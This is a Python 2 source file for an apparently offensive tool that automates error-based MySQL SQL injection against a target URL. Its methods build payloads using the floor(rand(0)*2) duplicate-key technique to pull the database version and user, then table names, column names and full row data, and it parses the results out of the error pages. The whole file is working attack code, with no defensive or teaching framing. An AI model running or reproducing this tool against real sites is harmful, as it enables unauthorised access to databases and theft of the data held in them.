import re
import urllib2
import webbrowser
import socket
import wget
import os
import binascii
from urllib import urlencode
from sys import argv, exit
from sqli import *

class SQLI_Quick_Blind(SW_SQLI):
	def getInfo(self):
		tmp = ' And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select  Concat(version(),0x7c,database(),0x7c,user())),floor(rAnd(0)*2),CHAR  (124))x From Information_Schema.Tables Group By x)a)'
		query = self.params['link'] + tmp
		result = self.doQuery(query)
		self.params['info'] = self.parseResult(result,1)
		self.logQuery('-----------\n' + self.params['info'] + '\n-----------')
	
	def getTable(self):
		tmp = ' And (Select 1 From( Select Count(*), Concat(CHAR (124), (Select  substr(Group_concat(table_name),1,145) FROM information_schema.tables  where table_schema=database()),floor(rAnd(0)*2), CHAR (124))x FROM  Information_Schema.Tables Group By x)a)'
		query = self.params['link'] + tmp
		result = self.doQuery(query)
		rs1 = self.parseResult(result,2)
		self.params['table'] = rs1
		baselen = len(rs1)
		offset = baselen
		while baselen == len(rs1):
			tmp = ' And (Select 1 From( Select Count(*), Concat(CHAR (124), (Select  substr(Group_concat(table_name),' + str(offset) + ',145) FROM information_schema.tables  where table_schema=database()),floor(rAnd(0)*2), CHAR (124))x FROM  Information_Schema.Tables Group By x)a)'
			query = self.params['link'] + tmp
			result = self.doQuery(query)
			rs1 = self.parseResult(result,2)
			self.params['table'] += rs1
			offset = offset + baselen
		self.logQuery('-----------\n' + self.params['table'] + '\n-----------')

	def getColumn(self,tblname):
		self.params['column'] = ''
		tblnamehex = tblname.encode("hex")
		tmp = ' And (Select 1 From( Select Count(*), Concat(CHAR (124), (Select  substr(Group_concat(column_name),1,145) FROM information_schema.columns  where table_schema=database() and table_name=0x' + tblnamehex + ')  ,floor(rAnd(0)*2), CHAR (124))x FROM Information_Schema.Tables Group By  x)a)'
		query = self.params['link'] + tmp
		result = self.doQuery(query)
		rs1 = self.parseResult(result,2)
		self.params['column'] = rs1
		baselen = len(rs1)
		offset = baselen
		while baselen == len(rs1):
			tmp = ' And (Select 1 From( Select Count(*), Concat(CHAR (124), (Select  substr(Group_concat(column_name),' + str(offset) + ',145) FROM information_schema.columns  where table_schema=database() and table_name=0x' + tblnamehex + '),floor(rAnd(0)*2), CHAR (124))x FROM Information_Schema.Tables Group By  x)a)'
			query = self.params['link'] + tmp
			result = self.doQuery(query)
			rs1 = self.parseResult(result,2)
			self.params['column'] += rs1
			offset = offset + baselen
		self.logQuery('-----------\n' + self.params['column'] + '\n-----------')

	def getData(self,cols,tblname):
		self.params['data'] = ''
		col_arr = cols.split(",")
		col_q_list = ''
		for c in col_arr:
			col_q_list += c + ',0x7c,'
		col_q_list += '0x7f' ## Final barrier
		tmp = ' And (Select 1 From( Select Count(*), Concat(CHAR (124), (Select  substr(Group_concat(' + col_q_list +'),1,145) FROM ' + tblname + ') ,floor(rAnd(0)*2), CHAR (124))x FROM  Information_Schema.Tables Group By x)a)'
		query = self.params['link'] + tmp
		result = self.doQuery(query)
		rs1 = self.parseResult(result,2)
		self.params['data'] = rs1
		baselen = len(rs1)
		offset = baselen
		while baselen == len(rs1):
			tmp = ' And (Select 1 From( Select Count(*), Concat(CHAR (124), (Select  substr(Group_concat(' + col_q_list +'),' + str(offset) + ',145) FROM ' + tblname + ') ,floor(rAnd(0)*2), CHAR (124))x FROM  Information_Schema.Tables Group By x)a)'
			query = self.params['link'] + tmp
			result = self.doQuery(query)
			rs1 = self.parseResult(result,2)
			self.params['data'] += rs1
			offset = offset + baselen
		self.logQuery('-----------\n' + self.params['data'] + '\n-----------')
	
	def parseResult(self,htmlRes,a=1):
		if htmlRes:
			tag_s = "Duplicate entry '|"
			tag_e = "' for key 'group_key'"
			begin = htmlRes.find(tag_s)
			if begin == -1:
				print "Khong the thuc hien sql injection...\n"
				exit()
			offset = 0
			end = htmlRes.find(tag_e,begin + 1)
			data = htmlRes[begin+len(tag_s):end]
			return data
		else:
			print "Khong the ket noi...\n"
			self.params['log'].close()
			exit()